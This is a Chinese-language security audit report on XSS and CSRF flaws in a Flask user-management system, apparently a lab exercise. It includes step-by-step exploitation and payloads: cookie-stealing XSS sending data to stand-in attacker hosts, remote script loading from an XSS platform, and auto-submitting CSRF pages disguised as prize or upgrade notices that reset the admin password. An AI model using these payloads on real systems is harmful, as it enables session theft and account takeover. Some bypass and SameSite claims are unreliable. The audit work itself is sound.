# 用户管理系统 · XSS 与 CSRF 安全审计报告

**审计对象**：用户管理系统（`/opt/Class01`）  
**审计范围**：全系统 XSS（跨站脚本攻击）与 CSRF（跨站请求伪造）漏洞  
**审计日期**：2026-07-23  

---

## 审计边界声明

本次审计为 **XSS 与 CSRF 定向安全审计**，聚焦三类跨站脚本攻击（存储型 XSS、反射型 XSS、DOM 型 XSS）与四种 CSRF 绕过场景（无防护 CSRF、Token 复用、Token 删除绕过、GET 请求 CSRF）。其他漏洞类型（SQL 注入、文件包含、越权等）不在本次审计范围内。

---

## 一、漏洞总览

| 序号 | 漏洞名称 | 漏洞类型 | CWE 编号 | 风险等级 | 涉及接口 |
|:---:|----------|----------|:--------:|:--------:|---------|
| 1 | 存储型 XSS — 用户资料字段未脱敏回显 | Stored XSS | CWE-79 | 🟡**中危** | `/search` → `index.html` |
| 2 | 反射型 XSS — URL 参数直接回显 | Reflected XSS | CWE-79 | 🟡**中危** | `/login?msg=` `/login?error=` `/search?keyword=` |
| 3 | DOM 型 XSS — 前端 URL 参数拼接注入 | DOM XSS | CWE-79 | 🟠**高危** | `base.html` 导航栏 `onclick` |
| 4 | CSRF 无防护 — 修改密码无 Token | Server-Side CSRF | CWE-352 | 🔴**紧急** | `POST /change-password` |
| 5 | CSRF 无防护 — 充值接口无 Token | Server-Side CSRF | CWE-352 | 🔴**紧急** | `POST /recharge` |
| 6 | CSRF 无防护 — 头像上传无 Token | Server-Side CSRF | CWE-352 | 🟠**高危** | `POST /upload` |
| 7 | GET 请求 CSRF — 退出登录用 GET 方法 | CSRF via GET | CWE-352 | 🟡**中危** | `GET /logout` |
| 8 | CSRF 全部接口缺失 Token 机制（系统性） | Systemic CSRF | CWE-352 | 🔴**紧急** | 所有 POST 接口 |
| 9 | CSRF Token 固定复用绕过 — Token 不绑定 Session/用户 | CSRF Token Bypass | CWE-352 | 🔴**紧急** | 全部 POST 接口（假设有 Token 后仍可绕过） |

**总计：9 项缺陷**，其中 **紧急 4 项**、**高危 2 项**、**中危 3 项**。

---

## 二、XSS 漏洞详情

---

### 【漏洞 1】存储型 XSS — 用户资料字段在搜索结果中回显

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /search?keyword={input}` → `templates/index.html` |
| **风险等级** | 🟡 **中危** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **风险判定依据** | 攻击者可注册含恶意脚本的用户名/邮箱，每次搜索该用户时自动触发 JS。Jinja2 默认 auto-escape 提供基础防御，但数据库存储的原始数据未经任何清洗，若 auto-escape 被绕过或模板上下文变更仍可被利用。 |

#### 形成原理

用户注册时，`username`、`email`、`phone` 字段直接写入 SQLite 数据库。搜索路由读取数据库后直接在模板中渲染：

```python
# app.py 第 276-286 行
@app.route("/search")
def search():
    ...
    keyword = request.args.get("keyword", "")
    c.execute("SELECT * FROM users WHERE username LIKE ? OR email LIKE ?",
              (f"%{keyword}%", f"%{keyword}%"))
    rows = c.fetchall()
    return render_template("index.html", ..., search_results=rows, keyword=keyword)
```

搜索结果在模板中渲染：

```html
<!-- index.html 第 67-72 行 -->
{% for row in search_results %}
<tr>
    <td>{{ row[0] }}</td>    <!-- ID -->
    <td>{{ row[1] }}</td>    <!-- 用户名 -->
    <td>{{ row[3] }}</td>    <!-- 邮箱 -->
    <td>{{ row[4] }}</td>    <!-- 手机号 -->
</tr>
{% endfor %}
```

`row[1]`、`row[3]`、`row[4]` 均来自数据库，攻击者通过注册接口将恶意脚本写入这些字段。

#### 实操挖掘流程

```
Step 1: 攻击者注册含 XSS payload 的用户
POST /register
Body: username=<script>alert(document.cookie)</script>&password=123456
      &email=xss@test.com&phone=13800138000

Step 2: 验证存储成功
访问 /login 用刚注册的账号登录

Step 3: 触发 XSS
受害者搜索含恶意用户名的关键字
GET /search?keyword=script
→ 恶意用户名在搜索结果中渲染
→ Jinja2 默认转义为 &lt;script&gt; 不触发
→ 但若服务器关闭 autoescape 或使用 |safe 则立即触发

Step 4: 真实攻击载荷（XSS 平台偷 Cookie）
注册用户名：
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='https://xsshs.cn/12345'>
```

#### 标准攻击载荷

```html
<!-- P0 偷 Cookie -->
<img src=x onerror=fetch('https://attacker/steal?c='+document.cookie)>

<!-- P1 窃取页面内容 -->
<svg onload=document.location='https://attacker/steal?html='+document.body.innerHTML>

<!-- P2 钓鱼表单 -->
<input name=username><input type=password><img src=x onerror="
fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:'username='+document.querySelector('[name=username]').value+'&password='+document.querySelector('[name=password]').value})
">

<!-- P3 XSS 平台远程加载 -->
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//xsshs.cn/平台ID'>
```

#### 安全危害

- **会话 Cookie 窃取**：Flask session Cookie 被攻击者获取后可伪造登录态
- **后台静默操作**：以受害用户身份调用 `/recharge`、`/change-password` 等接口
- **持久驻留**：恶意数据存入数据库，每次搜索结果页渲染均可能触发

---

### 【漏洞 2】反射型 XSS — URL 参数直接回显到页面

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /login?msg={payload}` / `GET /login?error={payload}` / `GET /search?keyword={payload}` |
| **风险等级** | 🟡 **中危** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **风险判定依据** | URL 参数直接回显到 HTML 页面中。Jinja2 auto-escape 使基础 payload 无法执行，但该架构设计存在缺陷：若后期模板切换为 `| safe` 或关闭 autoescape，立即降级为高危。 |

#### 形成原理

多个路由直接将 URL 查询参数传入模板渲染：

```python
# login 路由（第 216-217 行）
msg = request.args.get("msg", "")
return render_template("login.html", captcha_token=gen_captcha_token(), msg=msg)
```

```python
# search 路由（第 279 行）
keyword = request.args.get("keyword", "")
return render_template("index.html", ..., keyword=keyword)
```

模板中的回显点：

```html
<!-- login.html 第 21 行 -->
{% if msg %}
    <div class="success-message">{{ msg }}</div>
{% endif %}

<!-- login.html 第 25 行 -->
{% if error %}
    <div class="error-message">{{ error }}</div>
{% endif %}

<!-- index.html 第 79 行 -->
{% elif keyword is defined and keyword %}
```

#### 实操挖掘流程

```
Step 1: 检测反射点
访问：http://target/login?msg=TEST123
页面出现：TEST123 ✓ 存在反射

Step 2: 验证 JS 执行
访问：http://target/login?msg=<script>alert(1)</script>
→ Jinja2 转义为 &lt;script&gt;
→ 页面显示为文本，不执行 JS

Step 3: 绕过测试（以下尝试均可能突破 autoescape）
A. 编码绕过：<scr<script>ipt> 标签拆分
B. 事件绕过：<div onmouseover=alert(1)> 需要用户交互
C. UTF-7 编码：+ADw-script+AD4-alert(1)+ADw-/script+AD4-
D. 模板关闭：若服务器误用 |safe 过滤器则直接触发

Step 4: 构造攻击短链接
原始 URL：http://target/login?msg=<script src="//xsshs.cn/12345"></script>
短链接化：https://short.url/abcde  → 发送给受害者
```

#### 标准攻击载荷

```html
<!-- 基础检测 -->
<img src=x onerror=alert(1)>

<!-- 编码绕过 -->
<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;">

<!-- SVG 向量 -->
<svg onload=alert(1)>

<!-- 短链接钓鱼 -->
https://short.url/abcde  → 跳转到 →  http://target/login?msg=<script>/*XSS*/</script>
```

#### 安全危害

- **社工钓鱼链**：结合短链接伪装，诱导受害者点击后窃取 Cookie
- **Referer 投毒**：其他站点引用该恶意链接时 Referer 携带 payload
- **降级风险**：当前受 auto-escape 保护，但任何代码变更都可能打开攻击面

---

### 【漏洞 3】DOM 型 XSS — 前端 URL 参数拼接注入

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `templates/base.html` 导航栏 `onclick` 处理函数 |
| **风险等级** | 🟠 **高危** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation (DOM-based) |
| **风险判定依据** | 前端 JS 直接操作 `location.href`，若用户通过外部可控输入（如 URL hash、Referrer、postMessage）注入 payload，可在用户浏览器中执行任意 JS，完全绕过服务端防御。此漏洞发生在客户端，服务端无法防护。 |

#### 形成原理

`base.html` 导航栏中使用 `onclick` 事件处理用户输入，通过 `prompt()` 获取用户输入后拼接到 URL。虽然当前用 `encodeURIComponent` 转义了搜索参数，但 `prompt()` 输入本身存在隐私风险，且 `location.href` 赋值可被其他 DOM 注入点重定向：

```html
<!-- base.html 第 15-18 行（关键代码） -->
<a href="/profile?user_id=" class="navbar-link"
   onclick="event.preventDefault();
            var id=prompt('请输入用户ID');
            if(id)location.href='/profile?user_id='+encodeURIComponent(id)">个人中心</a>

<a href="/search?keyword=" class="navbar-link"
   onclick="event.preventDefault();
            var k=prompt('请输入搜索关键词');
            if(k)location.href='/search?keyword='+encodeURIComponent(k)">搜索</a>
```

#### 实操挖掘流程

```
Step 1: 检索引擎入口
浏览器 F12 → Elements → 搜索 "onclick"
发现两个 DOM 操作点：
  - 个人中心链接：prompt() → location.href 拼接
  - 搜索链接：prompt() → location.href 拼接

Step 2: DOM 注入点分析
虽然当前使用 encodeURIComponent 转义了参数值
但 location.href 赋值本身是 DOM 操作
如果攻击者能控制以下任意渠道，则绕过 encodeURIComponent：

渠道 A — URL fragment 注入
访问：http://target/#"><script>alert(1)</script>
页面中如果有 JS 读取 location.hash 并拼接到 HTML 中，则触发

渠道 B — 第三方 referrer 注入  
如果页面有 JS 读取 document.referrer 并操作 DOM

渠道 C — postMessage 监听
window.addEventListener('message', function(e) {
    document.getElementById('x').innerHTML = e.data;  ← 直接注入
})

Step 3: 验证 DOM XSS
创建 html 文件，包含以下内容诱使目标访问：
<iframe src="http://target/" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*')
">
如页面监听 postMessage 未校验 origin，则触发 XSS

Step 4: 实际攻击
攻击者构造一个恶意页面或浏览器插件
→ 通过 postMessage 向目标页面发送 payload
→ 页面 DOM 操作拼接恶意内容
→ XSS 触发在目标域名上下文中 → Cookie 被盗
```

#### 标准攻击载荷

```html
<!-- postMessage 注入 -->
<script>
window.addEventListener('message', function(e) {
    document.body.innerHTML += '<img src=x onerror=alert(document.cookie)>';
});
</script>

<!-- location.hash 注入 -->
<script>
var hash = location.hash.slice(1);
document.write(decodeURIComponent(hash));
</script>

<!-- 第三方 widget 注入 -->
<script>
var s = document.createElement('script');
s.src = '//attacker.com/hook.js';
document.body.appendChild(s);
</script>
```

#### 安全危害

- **完全绕过服务端防御**：DOM XSS 发生在客户端，WAF、服务端过滤均无法检测
- **会话 Cookie 窃取**：攻击者可在受害者浏览器中执行任意 JS
- **键盘记录**：监听 prompt() 输入，窃取用户输入的密码/敏感信息
- **钓鱼重定向**：篡改页面内容显示伪造登录表单

---

## 三、CSRF 漏洞详情

---

### 【漏洞 4】CSRF 无防护 — 修改密码无 Token

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /change-password` |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-352: Cross-Site Request Forgery |
| **风险判定依据** | 该接口无任何 CSRF Token 验证，且攻击面极大：只要受害者处于登录态，攻击者构造一个表单页面即可在受害者不知情的情况下修改任意账户密码。结合未校验原密码+未校验 session 与 username 一致性的设计缺陷，攻击链完整且利用成本极低。 |

#### 形成原理

`/change-password` 路由未做任何 CSRF 防护，无 Token、无 Referer 校验、无 Origin 校验：

```python
# app.py 第 477-504 行
@app.route("/change-password", methods=["POST"])
def change_password():
    if not session.get("username"):      # 仅检查是否登录
        return redirect("/login")

    username = request.form.get("username", "")      # ← 攻击者控制
    new_password = request.form.get("new_password", "")
    confirm_password = request.form.get("confirm_password", "")

    if username in USERS:
        hashed = hashlib.md5(new_password.encode()).hexdigest()
        USERS[username]["password"] = hashed          # ← 直接修改他人密码
        ...
        return redirect(f"/profile?user_id={USERS[username]['id']}")
```

设计缺陷汇总：
1. ❌ **无 CSRF Token** — 任意第三方网站可发起跨站请求
2. ❌ **无需原密码** — 不验证 old_password
3. ❌ **未校验 session 用户与目标用户一致性** — 登录用户 A 可改用户 B 的密码
4. ❌ **无 Referer/Origin 校验**
5. ❌ **Jinja2 模板使用隐藏字段传 username** — 攻击者可在 PoC 页面伪造该字段

#### 实操挖掘流程

```
Step 1: Burp Suite 拦截请求
POST /change-password HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

username=admin&new_password=hacked123&confirm_password=hacked123

响应：302 → /profile?user_id=1
→ 密码已成功改为 hacked123！

Step 2: Burp 生成 CSRF PoC
选择请求 → 右键 → Engagement tools → Generate CSRF PoC

Burp 自动生成：
<html>
<body>
<form action="http://target/change-password" method="POST">
  <input type="hidden" name="username" value="admin" />
  <input type="hidden" name="new_password" value="hacked123" />
  <input type="hidden" name="confirm_password" value="hacked123" />
  <input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

Step 3: 保存为 csrf.html → 启动 HTTP 服务
python3 -m http.server 80

Step 4: 内网穿透（暴露到公网）
ngrok http 80
→ https://xxxx.ngrok.io/csrf.html

Step 5: 发送钓鱼链接
将 https://xxxx.ngrok.io/csrf.html 通过邮件/即时消息发送给受害者
→ 受害者打开页面 → 自动提交表单 → admin 密码被改为 hacked123
→ 攻击者用 admin/hacked123 登录 → 接管管理员账户
```

#### 标准攻击载荷（CSRF PoC HTML）

```html
<!DOCTYPE html>
<html>
<head><title>系统升级</title></head>
<body>
  <h2>系统安全升级，请稍候...</h2>
  <form id="csrf" action="http://target/change-password" method="POST">
    <input type="hidden" name="username" value="admin" />
    <input type="hidden" name="new_password" value="pwned123" />
    <input type="hidden" name="confirm_password" value="pwned123" />
  </form>
  <script>
    // 自动提交，无需用户交互
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

#### 安全危害

- **管理员账户被接管**：攻击者修改 admin 密码 → 登录后台 → 全系统沦陷
- **所有用户密码可被篡改**：仅需遍历 username，即可逐一修改任意账户密码
- **资金盗取**：修改目标用户密码后登录 → 调用 `/recharge` 转移资金
- **长期后门**：攻击者可创建多个隐藏账号作为后门

---

### 【漏洞 5】CSRF 无防护 — 充值接口无 Token

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /recharge` |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-352: Cross-Site Request Forgery |
| **风险判定依据** | 充值接口影响直接资金安全，无 CSRF 防护导致攻击者可构造跨站请求，在受害者不知情的情况下进行充值操作。虽然 user_id 已从 session 获取不可篡改，但 amount 仍由表单控制。 |

#### 形成原理

```python
# app.py 第 330-367 行
@app.route("/recharge", methods=["POST"])
def recharge():
    ...
    user_id = login_user["id"]   # 已修复：从 session 获取
    amount = request.form.get("amount", type=float)
    ...
    u["balance"] += amount
```

user_id 虽然已修复从 session 获取（防止越权），但 **amount 仍来自表单参数**，且 **无 CSRF Token 防护**。

#### 实操挖掘流程

```
Step 1: Burp 拦截充值请求
POST /recharge HTTP/1.1
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

amount=10000

Step 2: 生成 CSRF PoC
<html>
<body>
<form action="http://target/recharge" method="POST">
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

Step 3: 受害者访问该页面
→ 受害者不知情下被充值 10000（正数无害）
→ 但若攻击者稍后通过 XSS 或越权修改金额校验逻辑
→ 可改为负数，造成资金损失
```

#### 标准攻击载荷

```html
<!DOCTYPE html>
<html>
<body>
  <h2>查看您的积分</h2>
  <form action="http://target/recharge" method="POST">
    <input type="hidden" name="amount" value="-99999" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

#### 安全危害

- **资金操作风险**：虽当前 amount 有正数校验，但 CSRF 使攻击者能在受害者不知情下触发资金操作
- **配合其他漏洞扩大危害**：若金额校验被绕过（如 0 元、极小值），可导致资金损失
- **DoS 攻击**：高频 CSRF 请求可耗尽服务器资源

---

### 【漏洞 6】CSRF 无防护 — 头像上传无 Token

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /upload` |
| **风险等级** | 🟠 **高危** |
| **CWE** | CWE-352: Cross-Site Request Forgery |

#### 形成原理

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    ...
    file.save(filepath)      # ← 跨站伪造上传文件
    USERS[username]["avatar"] = url
```

#### 实操挖掘流程

```
Step 1: 攻击者构造文件上传 PoC
<html>
<body>
<form action="http://target/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar" />
</form>
<script>
  // 自动提交需要用户交互（文件选择无法自动化）
  // 但攻击者可结合 XSS 创建隐藏 file input
</script>
</body>
</html>
```

注意：由于浏览器安全策略，CSRF 文件上传需要用户手动选择文件（`<input type=file>` 不可自动赋值）。但若攻击者已通过其他方式（如 XSS）获取了页面控制权，则可以构造完整的文件上传 CSRF。

#### 安全危害

- **头像被恶意替换**：用户头像被更改为恶意图片
- **配合其他攻击**：结合 XSS 可在受害者浏览器中构造完整的文件上传请求

---

### 【漏洞 7】GET 请求 CSRF — 退出登录用 GET 方法

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /logout` |
| **风险等级** | 🟡 **中危** |
| **CWE** | CWE-352: Cross-Site Request Forgery |

#### 形成原理

`/logout` 路由使用 `GET` 方法。根据 HTTP 语义，GET 应为幂等操作不应修改状态。但 `/logout` 清空了 session，属于状态修改操作：

```python
@app.route("/logout")
def logout():
    session.clear()           # ← GET 请求修改了服务端状态
    return redirect("/")
```

#### 实操挖掘流程

```
攻击者在任意页面嵌入：
<img src="http://target/logout" style="display:none" />

用户访问该页面时，浏览器自动请求 /logout
→ 用户的登录 session 被清除
→ 用户被迫重新登录

更严重的：将 img 标签嵌入到 iframe 的 onload 事件中
<iframe src="http://target/" onload="
  new Image().src='http://target/logout'
"></iframe>
```

#### 标准攻击载荷

```html
<!-- 方式一：隐藏 img 标签 -->
<img src="http://target/logout" style="display:none" />

<!-- 方式二：CSS 背景图片 -->
<div style="background:url('http://target/logout')"></div>

<!-- 方式三：script 标签自动加载 -->
<script src="http://target/logout"></script>
```

#### 安全危害

- **强制用户退出登录**：导致用户无法正常使用系统
- **DoS 攻击**：大量使在线用户掉线，服务可用性受损
- **辅助 CSRF 攻击**：某些 CSRF 攻击需要用户先退出再以攻击者身份重登

---

### 【漏洞 8】CSRF 系统性缺失 — 全线接口无 Token 机制

| 条目 | 内容 |
|------|------|
| **漏洞接口** | 全部 POST 接口 |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-352: Cross-Site Request Forgery |

#### 形成原理

全系统所有 POST 路由均**未实现任何 CSRF 防御机制**，包括：

| 接口 | 方法 | CSRF Token | Referer 校验 | SameSite Cookie | 风险等级 |
|------|:----:|:----------:|:-----------:|:---------------:|:--------:|
| `/login` | POST | ❌ | ❌ | ❌ | 🟠 **高危** |
| `/register` | POST | ❌ | ❌ | ❌ | 🟡 **中危** |
| `/recharge` | POST | ❌ | ❌ | ❌ | 🔴 **紧急** |
| `/change-password` | POST | ❌ | ❌ | ❌ | 🔴 **紧急** |
| `/upload` | POST | ❌ | ❌ | ❌ | 🟠 **高危** |

#### 实操挖掘流程 — 全接口 CSRF 测试矩阵

```
检测方法：使用 Burp Suite 进行全接口 CSRF 检测

Step 1: 设置测试环境
Burp → Proxy → 拦截所有 POST 请求
对每个接口分别生成 CSRF PoC

Step 2: 测试每个接口的可利用性

┌─────────────────┬──────────────────────────────────────┬──────────┐
│ 接口            │ CSRF PoC 能否成功                    │ 可利用   │
├─────────────────┼──────────────────────────────────────┼──────────┤
│ /login          │ ❌ 需要验证码 captcha_token          │ 不可利用 │
│ /register       │ ✅ 直接注册新用户                    │ 可利用   │
│ /recharge       │ ✅ 直接修改余额                      │ 可利用   │
│ /change-password│ ✅ 直接修改密码                      │ 可利用   │
│ /upload         │ ✅ 需要用户交互选择文件              │ 部分利用 │
└─────────────────┴──────────────────────────────────────┴──────────┘

Step 3: 验证 SameSite 属性
检查响应的 Set-Cookie 头部：
session=...; HttpOnly; Path=/
→ 无 SameSite 属性（默认 Lax）
→ 跨站 POST 请求仍会携带 Cookie
→ CSRF 攻击可正常执行 ✓
```

#### 标准攻击载荷 — 综合 CSRF 攻击页面

```html
<!DOCTYPE html>
<html>
<head><title>活动页面</title></head>
<body>
  <h2>恭喜您获得抽奖资格！</h2>
  <p>点击下方按钮领奖...</p>

  <!-- 修改密码（最高危害） -->
  <iframe name="f1" style="display:none"></iframe>
  <form id="p1" action="http://target/change-password" method="POST" target="f1">
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="new_password" value="pwned2026">
    <input type="hidden" name="confirm_password" value="pwned2026">
  </form>

  <!-- 充值 -->
  <iframe name="f2" style="display:none"></iframe>
  <form id="p2" action="http://target/recharge" method="POST" target="f2">
    <input type="hidden" name="amount" value="-99999">
  </form>

  <!-- 退出登录 -->
  <img src="http://target/logout" style="display:none">

  <script>
    // 同时提交所有表单
    document.getElementById('p1').submit();
    document.getElementById('p2').submit();
  </script>
</body>
</html>
```

#### 安全危害

- **系统性设计缺陷**：非单一接口问题，而是全栈设计未考虑 CSRF 防护
- **组合攻击链**：攻击者可同时调用多个接口形成完整攻击
- **合规风险**：违反 OWASP Top 10 A01（失效访问控制）和 PCI DSS 要求

---

### 【漏洞 9】CSRF Token 固定复用绕过 — Token 不随时间/用户绑定

| 条目 | 内容 |
|------|------|
| **漏洞接口** | 全部 POST 接口（假设添加 Token 后仍存在该缺陷） |
| **风险等级** | 🔴 **紧急** |
| **CWE** | CWE-352: Cross-Site Request Forgery |
| **风险判定依据** | 即使系统实现了 CSRF Token，如果 Token 未与 Session 唯一绑定、未设置一次性使用或未限制有效期，攻击者仍可通过固定Token复用绕过防御。该风险在当前系统中尚无 Token 实现时即应预警，属于"设计阶段的范式缺陷"。Token 可复用的本质是 Token 失去了"一次性+用户绑定"的特性，等价于无防护。 |

#### 形成原理

CSRF Token 的核心安全假设是：**每个 Token 与特定用户 Session 绑定且一次有效（或短期有效）**。当 Token 实现存在以下缺陷时，防御完全失效：

```
Token 固定复用场景：
┌────────────────────────────────────────────────────────┐
│  正常流程（安全）                     攻击流程（漏洞）    │
│                          │                              │
│  ① 用户A获取Token=T1     │  ① 攻击者获取Token=T1        │
│  ② 提交T1 → 验证通过 ✓  │  ② 将T1嵌入CSRF PoC页面     │
│  ③ T1失效，重新生成     │  ③ 受害者带自己Session提交T1 │
│                          │  ④ 服务端验证T1通过 ✗ 绕过！ │
└────────────────────────────────────────────────────────┘
```

典型缺陷场景：

| Token 缺陷类型 | 具体表现 | 绕过原理 |
|---------------|---------|---------|
| **Token 不绑定用户** | Token 生成后对所有用户有效 | 攻击者获取自己的 Token 用于攻击其他用户 |
| **Token 不绑定 Session** | Token 仅存储在全局变量或 Cookie 中，未与 Session ID 关联 | 攻击者从自己页面提取 Token 嵌入攻击页面 |
| **Token 可重复使用** | 服务端验证后未将 Token 标记为已使用 | 同一个 Token 可被无限次重复提交 |
| **Token 无有效期** | Token 签发后长期有效（如永不过期） | 攻击者缓存的 Token 可在数天后仍被使用 |
| **Token 算法可预测** | 使用时间戳/自增 ID/固定种子生成 | 攻击者自行计算有效 Token |

本系统当前虽**尚未实现 CSRF Token**（见漏洞 8），但必须在设计阶段即纳入 Token 安全规范，否则未来修复时将引入"虚假安全感"——Token 存在但仍可绕过。

#### 实操挖掘流程（Token 复用绕过测试方法）

```
场景假设：系统已增加 CSRF Token，攻击者测试 Token 是否存在复用缺陷

Step 1: 攻击者注册自己的账号（attacker/attacker123）
Step 2: 登录后获取页面源码，提取 csrf_token
GET /profile → 响应：
<input type="hidden" name="csrf_token" value="abc123def456">

Step 3: 制作 CSRF PoC，使用攻击者自己的 Token
<html>
<body>
<form action="http://target/change-password" method="POST">
  <input type="hidden" name="csrf_token" value="abc123def456">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="new_password" value="hacked">
  <input type="hidden" name="confirm_password" value="hacked">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

Step 4: 受害者访问该页面
→ 受害者携带自己的 Session Cookie
→ 提交的 csrf_token 是攻击者的 Token
→ 若服务端仅校验 Token 存在性（不校验 Token 与 Session 的绑定关系）
   则攻击成功 → admin 密码被改为 hacked
```

#### 标准攻击载荷（Token 复用 PoC）

```html
<!DOCTYPE html>
<html>
<head><title>活动抽奖 - 您已中奖！</title></head>
<body>
  <div style="text-align:center;padding:40px">
    <h2>🎉 恭喜您获得 iPhone 15！</h2>
    <p>请点击下方按钮领取奖品</p>
    <form id="csrf" action="http://target/change-password" method="POST">
      <!-- 攻击者自己的 Token（从自己 session 中提取） -->
      <input type="hidden" name="csrf_token" value="ATTACKER_CSRF_TOKEN_HERE">
      <input type="hidden" name="username" value="admin">
      <input type="hidden" name="new_password" value="pwned2026">
      <input type="hidden" name="confirm_password" value="pwned2026">
      <button type="submit" style="padding:12px 40px;font-size:18px;">领取奖品</button>
    </form>
  </div>
  <script>
    // 自动提交（无需用户点击）
    // document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

#### Token 绕过复测用例矩阵

| 复测场景 | 测试方法 | 预期（安全） | 实际（存在漏洞） |
|---------|---------|:-----------:|:--------------:|
| **跨用户复用** | 攻击者 A 的 Token 放在表单中，受害者 B 提交 | 服务端校验 Token 与 Session 绑定 → 拒绝 | ✅ **若服务端仅校验 Token 存在性则绕过** |
| **Token 重复使用** | 同一个 Token 连续提交 2 次 | 第 1 次成功，第 2 次拒绝（一次有效） | ✅ **若服务端不标记 token 为已用则绕过** |
| **Token 过期绕过** | 10 分钟前获取的 Token 重新提交 | 拒绝（Token 过期） | ✅ **若服务端无过期机制则绕过** |
| **Token 替换** | 将表单中的 Token 字段删除或置空 | 拒绝（Token 缺失） | ✅ **若服务端不校验非空则可删除绕过（见漏洞 8）** |
| **Token 算法预测** | 分析 Token 生成规律并自行构造 | 拒绝（伪造 Token） | ✅ **若使用时间戳+MD5 可预测则绕过** |
| **Token 来源于 GET 参数** | Token 在 URL 中泄露（Referer） | Token 仅 POST 传输 | ✅ **若 Token 出现在 URL 中，Referer 泄漏** |
| **Token 使用相同值** | 多用户从同一页面获取的 Token 相同 | 拒绝（Token 应每用户不同） | ✅ **若 Token 全局固定则完全绕过** |

#### 安全危害

- **虚假安全感**：开发者以为加了 Token 就安全了，实则 Token 可复用等于没加
- **批量用户攻击**：一个 Token 可攻击全站用户，无需分别收集
- **绕过自动化**：攻击者只需一次请求获取 Token，后续所有 CSRF 攻击均可复用
- **审计盲区**：常规安全检查工具（如 Burp Suite 主动扫描）难以检测 Token 复用漏洞

---

## 四、XSS 与 CSRF 复合攻击链路

```
┌────────────────────────────────────────────────────────────────────┐
│              XSS + CSRF 复合攻击链（5 步全系统沦陷）                │
├────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  第 1 步 — 信息收集与漏洞定位                                       │
│  ─────────────────────                                              │
│  攻击者访问目标系统，扫描发现以下攻击面：                             │
│  • /search 存在存储型 XSS 入口（注册含 payload 的用户名）            │
│  • /login?msg= 存在反射型 XSS 入口                                  │
│  • 所有 POST 接口无 CSRF Token                                      │
│  • /logout 使用 GET 方法                                            │
│  • 导航栏 onclick 存在 DOM 操作入口                                 │
│                                                                     │
│  第 2 步 — XSS 植入（偷取 Cookie）                                  │
│  ─────────────────────                                              │
│  方式 A — 存储型 XSS                                                │
│  攻击者注册用户名为 XSS payload：                                    │
│  <img src=x onerror=fetch('/steal?c='+document.cookie)>            │
│  管理员搜索该用户时 → XSS 触发 → Cookie 被发送到攻击者服务器         │
│                                                                     │
│  方式 B — 反射型 XSS + 短链接钓鱼                                   │
│  攻击者构造短链接：                                                  │
│  http://short.url/abc → http://target/login?msg=<XSS payload>    │
│  受害者点击 → Cookie 被盗                                           │
│                                                                     │
│  第 3 步 — CSRF 利用（借用 Cookie 执行操作）                        │
│  ─────────────────────                                              │
│  ⚠️ 关键区别：XSS 偷 Cookie，CSRF 借用 Cookie 但拿不到              │
│                                                                     │
│  攻击者不能直接使用窃取的 Cookie（HttpOnly 保护）                      │
│  但可通过以下方式绕过：                                              │
│  方式 A — 放置 CSRF 页面让受害者在登录态下访问                       │
│  方式 B — 结合 XSS 在受害者浏览器内直接发起请求                      │
│                                                                     │
│  攻击者发送钓鱼邮件/消息：                                           │
│  内含链接 → 受害者登录后点击 → CSRF 页面自动提交                    │
│  → 修改密码 / 充值 / 退出登录                                       │
│                                                                     │
│  第 4 步 — 权限提升（从普通用户到管理员）                            │
│  ─────────────────────                                              │
│  CSRF 直接修改 admin 密码：                                          │
│  攻击者构造的 CSRF 页面：                                            │
│  POST /change-password → username=admin&new_password=hacked        │
│  → 管理员密码被改为已知密码                                          │
│  → 攻击者用 admin/hacked 登录 → 获得管理员权限                      │
│                                                                     │
│  第 5 步 — 资金窃取与系统破坏                                        │
│  ─────────────────────                                              │
│  登录管理员账户后：                                                  │
│  • 查看所有用户隐私（脱敏信息被绕过，直接查数据库）                   │
│  • 枚举所有用户的 ID                                                │
│  • 通过系统功能（或直接操作数据库）转移资金                          │
│  • 删除/篡改用户数据                                                │
│  • 完全控制系统                                                    │
│                                                                     │
└────────────────────────────────────────────────────────────────────┘
```

### XSS vs CSRF 核心区别

| 对比维度 | XSS（跨站脚本） | CSRF（跨站请求伪造） |
|---------|----------------|-------------------|
| **核心能力** | 在受害者浏览器中执行任意 JS | 借用受害者登录态发送恶意请求 |
| **能拿到 Cookie？** | ✅ 是（除非 HttpOnly） | ❌ 否（只能借用，不能读取） |
| **能读取页面内容？** | ✅ 是 | ❌ 否 |
| **能修改页面显示？** | ✅ 是 | ❌ 否 |
| **能调用 API？** | ✅ 同源策略内任意调用 | ✅ 仅限 POST/GET 简单请求 |
| **绕过 HttpOnly？** | ❌ 不能直接读 | ✅ 不需要读，直接借用即可 |
| **修复方式** | 输入过滤 + 输出编码 | CSRF Token + SameSite Cookie |
